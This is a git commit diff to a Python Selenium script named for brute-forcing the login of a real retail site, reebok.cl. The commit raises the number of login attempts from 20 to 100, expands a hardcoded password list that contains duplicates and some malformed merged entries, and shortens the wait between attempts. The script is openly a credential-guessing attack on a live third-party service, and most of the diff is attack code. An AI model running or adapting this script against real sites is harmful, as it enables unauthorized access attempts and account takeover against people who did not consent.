7a2f0b0474adc0ccd9901e94f6869f92336c8850
JohanFuentes <80370364+JohanFuentes@users.noreply.github.com>
2022-05-15 17:51:11 -0400

    Update LoginFuerzaBrutaReebok.py

--- LoginFuerzaBrutaReebok.py
+++ LoginFuerzaBrutaReebok.py
@@ -9,13 +9,21 @@ url = "https://www.reebok.cl/account-login"
 
 username = "ejemplocorreo@gmail.com"
 
-password = ["SerWE3r45", "PereweW45", "Prueba1234.", "3o23FFes233", "18fFErna1", 
+#fuerza bruta con 100 intentos
+
+password = ["SerWE3r45", "PereweW45", "Prueba123456789.", "3o23FFes233", "18fFErna1", "2FDFti12", "BaEWWEno12", "MoewW1234", "FRFito1234", "RFFirez2011", "ciesfFF23", "2fsfFarzo2002", "Lawwew12113", "MDWEneea31", "AlmrSa213", 
+"Tom21asito", "flacA121958", "LS1ia2533", "mE112ticito10", "123456Jf,SerWE3r45", "PereweW45", "Prueba123456789.", "3o23FFes233", "18fFErna1","2FDFti12", "BaEWWEno12", "MoewW1234", "FRFito1234", "RFFirez2011", 
+"ciesfFF23", "2fsfFarzo2002", "Lawwew12113", "MDWEneea31", "AlmrSa213","Tom21asito", "flacA121958", "LS1ia2533", "mE112ticito10", "123456Jf, SerWE3r45", "PereweW45", "Prueba123456789.", "3o23FFes233", "18fFErna1", 
+"2FDFti12", "BaEWWEno12", "MoewW1234", "FRFito1234", "RFFirez2011","ciesfFF23", "2fsfFarzo2002", "Lawwew12113", "MDWEneea31", "AlmrSa213","Tom21asito", "flacA121958", "LS1ia2533", "mE112ticito10", "123456Jf, SerWE3r45", "PereweW45", "Prueba123456789.", "3o23FFes233", "18fFErna1", 
+"2FDFti12", "BaEWWEno12", "MoewW1234", "FRFito1234", "RFFirez2011", 
+"ciesfFF23", "2fsfFarzo2002", "Lawwew12113", "MDWEneea31", "AlmrSa213", 
+"Tom21asito", "flacA121958", "LS1ia2533", "mE112ticito10", "123456Jf, SerWE3r45", "PereweW45", "Prueba123456789.", "3o23FFes233", "18fFErna1", 
 "2FDFti12", "BaEWWEno12", "MoewW1234", "FRFito1234", "RFFirez2011", 
 "ciesfFF23", "2fsfFarzo2002", "Lawwew12113", "MDWEneea31", "AlmrSa213", 
 "Tom21asito", "flacA121958", "LS1ia2533", "mE112ticito10", "123456Jf"]
 
 users = 0
-while users < 20:
+while users < 100:
 
     time.sleep(1)
     driver = webdriver.Chrome()
@@ -36,7 +44,7 @@ while users < 20:
     check_box = driver.find_element_by_xpath('//*[@id="app"]/div/div[1]/div/div/div/div[2]/div[1]/form/div[7]/button')
     check_box.click()
 
-    time.sleep(10)
+    time.sleep(6)
 
     driver.close()
     users = users + 1
